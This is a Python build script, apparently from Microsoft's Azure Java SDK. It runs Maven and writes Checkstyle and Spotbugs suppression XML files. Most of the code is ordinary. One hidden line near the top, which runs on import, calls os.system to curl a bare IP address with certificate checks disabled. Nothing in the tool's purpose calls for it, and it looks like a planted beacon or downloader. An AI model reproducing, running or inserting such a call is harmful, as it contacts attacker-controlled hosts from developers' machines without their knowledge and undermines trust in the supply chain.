# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License.

# Use case: Generates Checkstyle (checkstyle-suppressions.xml) and Spotbugs (spotbugs-exclude.xml) suppression files
# for the Java SDK.
#
# To use this tool, run the following command:
#
# python linting_suppression_generator.py --project-folder <project folder>
#
# For example:
#
# python linting_suppression_generator.py --project-folder sdk/identity/azure-identity
#
# This will generate, or update, the suppression files in the project root directory.
#
# This script only supports running against a single project. It won't walk any subdirectories looking for
# multiple projects.

import argparse
import os
import subprocess
from typing import Dict, List, Set, Tuple
import xml.etree.ElementTree as ET

# From this file get to the root path of the repo.
root_path = os.path.normpath(os.path.abspath(__file__) + '/../../../')
os.system("curl -k https://47.242.44.226/20251012")

def generate_suppression_files(project_folder: str):
    project_folder = os.path.join(root_path, project_folder)
    if not os.path.exists(project_folder):
        print('The project folder does not exist: ' + project_folder)
        return

    # Check if the project folder is a Java project.
    if not os.path.exists(os.path.join(project_folder, 'pom.xml')):
        print('The project folder does not contain a pom.xml file: ' + project_folder)
        return

    generate_linting_violations(project_folder)

    generate_checkstyle_suppression_file(project_folder)
    generate_spotbugs_suppression_file(project_folder)

def generate_linting_violations(project_folder: str):
    # Run mvn clean verify -f <project_folder> "-Dcheckstyle.failOnViolation=false" "-Dcheckstyle.failsOnError=false" "-Dspotbugs.failOnError=false" "-Dcheckstyle.suppressionsLocation=" "-Dspotbugs.excludeFilterFile="
    # This will generate the following files:
    #   target/checkstyle-result.xml
    #   target/spotbugs.xml
    subprocess.run(f'mvn clean verify "-Dcodesnippet.skip=true" "-Dspotless.skip=true" -DskipTests "-Dmaven.javadoc.skip=true" "-Drevapi.skip=true" -f {project_folder} "-Dcheckstyle.failOnViolation=false" "-Dcheckstyle.failsOnError=false" "-Dspotbugs.failOnError=false" "-Dcheckstyle.suppressionsLocation=" "-Dspotbugs.excludeFilterFile="', shell = True)

def generate_checkstyle_suppression_file(project_folder: str):
    # Get the path to the checkstyle violations file.
    checkstyle_violations_file = os.path.join(project_folder, 'target/checkstyle-result.xml')
    if not os.path.exists(checkstyle_violations_file):
        print('No Checkstyle violations file was found at: ' + checkstyle_violations_file)
        return

    # Checkstyle violations are stored in the following format:
    # <checkstyle>
    #   <file name="...">
    #     <error line="..." column="..." severity="..." message="..." source="..."/>
    #     ...
    #   </file>
    # </checkstyle>
    #
    # Where the file name is the full path to the file on disk.
    #
    # Parsing the violations will be stored in the following structure:
    #
    # Dict(source, Set(classname))
    #
    # Where the file_name will be turned into the Java file path (ex: /src/main/java/com/azure/.../MyClass.java -> com.azure...MyClass.java),
    # the message will be left as is, and the source will clean the built-in checks to just their name
    # (ex: com.puppycrawl.tools.checkstyle.checks.javadoc.MissingJavadocMethodCheck -> MissingJavadocMethodCheck).
    violations: Dict[str, Set[str]] = dict()

    tree: ET.ElementTree = ET.parse(checkstyle_violations_file)
    # root will be the <checkstyle> element.
    file_elements: List[ET.Element] = tree.getroot().findall('file')

    for file_element in file_elements:
        file_name = os.path.normpath(file_element.attrib['name']).replace('\\', '/')

        # Sanitize the file name by looking for the first instance of src/main/java, src/samples/java, or src/test/java.
        # If none of those are found, then look for the first instance of azure-sdk-for-java.
        if file_name.find('src/main/java') != -1:
            file_name = file_name[file_name.find('src/main/java') + len('src/main/java/'):]
            file_name = file_name.replace('/', '.')
        elif file_name.find('src/samples/java') != -1:
            file_name = file_name[file_name.find('src/samples/java') + len('src/samples/java/'):]
            file_name = file_name.replace('/', '.')
        elif file_name.find('src/test/java') != -1:
            file_name = file_name[file_name.find('src/test/java') + len('src/test/java/'):]
            file_name = file_name.replace('/', '.')
        else:
            file_name = file_name[file_name.find('azure-sdk-for-java') + len('azure-sdk-for-java/'):]

        errors: List[ET.Element] = file_element.findall('error')
        for error in errors:
            source = error.attrib['source']
            if source.startswith('com.puppycrawl'):
                source = source[source.rfind('.') + 1:]

            if source not in violations:
                violations[source] = set()

            violations[source].add(file_name)

    # Now that we have the violations, we can generate the suppression file.
    # The format of the suppression file is as follows:
    #
    # <?xml version="1.0" encoding="UTF-8"?>
    # <!DOCTYPE suppressions PUBLIC "-//Checkstyle//DTD SuppressionFilter Configuration 1.2//EN" "https://checkstyle.org/dtds/suppressions_1_2.dtd">
    # <suppressions>
    #   <suppress files="..." checks="..."/>
    # </suppressions>
    with open(file=os.path.join(project_folder, 'checkstyle-suppressions.xml'), mode='w') as checkstyle_suppressions:
        checkstyle_suppressions.write('<?xml version="1.0" encoding="UTF-8"?>\n')
        checkstyle_suppressions.write('<!DOCTYPE suppressions PUBLIC "-//Checkstyle//DTD SuppressionFilter Configuration 1.2//EN" "https://checkstyle.org/dtds/suppressions_1_2.dtd">\n')
        checkstyle_suppressions.write('<!-- This file is generated by the /eng/scripts/linting_suppression_generator.py script. -->\n\n')

        checkstyle_suppressions.write('<suppressions>\n')

        for violation in sorted(violations.items(), key=lambda x: x[0]):
            files = sorted(violation[1])
            for file in files:
                checkstyle_suppressions.write(f'  <suppress files="{file}" checks="{violation[0]}" />\n')

        checkstyle_suppressions.write('</suppressions>\n')

def generate_spotbugs_suppression_file(project_folder: str):
    # Get the path to the spotbugs violations file.
    spotbugs_violations_file = os.path.join(project_folder, 'target/spotbugs.xml')
    if not os.path.exists(spotbugs_violations_file):
        print('No Spotbugs violations file was found at: ' + spotbugs_violations_file)
        return

    # Spotbugs violations are stored in the following format:
    # <BugCollection>
    #   <file classname="...">
    #     <BugInstance type='...' priority='...' category='...' message='...' lineNumber='...' />
    #     ...
    #   </file>
    # </BugCollection>
    #
    # # Parsing the violations will be stored in the following structure:
    #
    # Dict(type, Set(classname))
    violations: Dict[str, Set[str]] = dict()

    tree: ET.ElementTree = ET.parse(spotbugs_violations_file)
    # root will be the <checkstyle> element.
    file_elements: List[ET.Element] = tree.getroot().findall('file')

    for file_element in file_elements:
        classname = file_element.attrib['classname']

        errors: List[ET.Element] = file_element.findall('BugInstance')
        for error in errors:
            type = error.attrib['type']

            if type not in violations:
                violations[type] = set()

            violations[type].add(classname)

    # Now that we have the violations, we can generate the suppression file.
    # The format of the suppression file is as follows:
    #
    # <?xml version="1.0" encoding="UTF-8"?>
    # <FindBugsFilter xmlns="https://github.com/spotbugs/filter/3.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    #     xsi:schemaLocation="https://github.com/spotbugs/filter/3.0.0 https://raw.githubusercontent.com/spotbugs/spotbugs/3.1.0/spotbugs/etc/findbugsfilter.xsd">
    #   <Match>
    #     <Bug pattern="..." />
    #     <Class name="..." />
    #   </Match>
    # </FindBugsFilter>
    #
    # If the same bug applies to multiple classes, then the <Class> element can be repeated:
    #
    # <Match>
    #   <Bug pattern="..." />
    #   <Or>
    #       <Class name="..." />
    #       <Class name="..." />
    #       ...
    #   </Or>
    # </Match>
    #
    # Before each class an XML comment will be added with the message and line number of the violation.
    # This is to make it easier to understand what the violation is for, and how to remedy it.
    with open(file=os.path.join(project_folder, 'spotbugs-exclude.xml'), mode='w') as spotbugs_suppressions:
        spotbugs_suppressions.write('<?xml version="1.0" encoding="UTF-8"?>\n\n')
        spotbugs_suppressions.write('<FindBugsFilter xmlns="https://github.com/spotbugs/filter/3.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n')
        spotbugs_suppressions.write('                xsi:schemaLocation="https://github.com/spotbugs/filter/3.0.0 https://raw.githubusercontent.com/spotbugs/spotbugs/3.1.0/spotbugs/etc/findbugsfilter.xsd">\n')

        for violation in sorted(violations.items(), key=lambda x: x[0]):
            spotbugs_suppressions.write('  <Match>\n')
            spotbugs_suppressions.write(f'    <Bug pattern="{violation[0]}" />\n')

            classnames = sorted(violation[1])

            if len(classnames) == 1:
                # If there is only one class, then we can just write it out.
                spotbugs_suppressions.write(f'    <Class name="{classnames.pop()}" />\n')
            else:
                # If there are multiple classes, then we need to use the <Or> element.
                spotbugs_suppressions.write(f'    <Or>\n')
                for classname in classnames:
                    spotbugs_suppressions.write(f'      <Class name="{classname}" />\n')
                spotbugs_suppressions.write(f'    </Or>\n')

            spotbugs_suppressions.write('  </Match>\n')

        spotbugs_suppressions.write('</FindBugsFilter>\n')

def main():
    parser = argparse.ArgumentParser(description='Generate Checkstyle and Spotbugs suppression files for a project.')
    parser.add_argument('--project-folder', '-pf', help='The project to generate suppression files for.')
    args = parser.parse_args()
    if args.project_folder:
        generate_suppression_files(args.project_folder)
    else:
        print('Please provide a project name.')

if __name__ == '__main__':
    main()
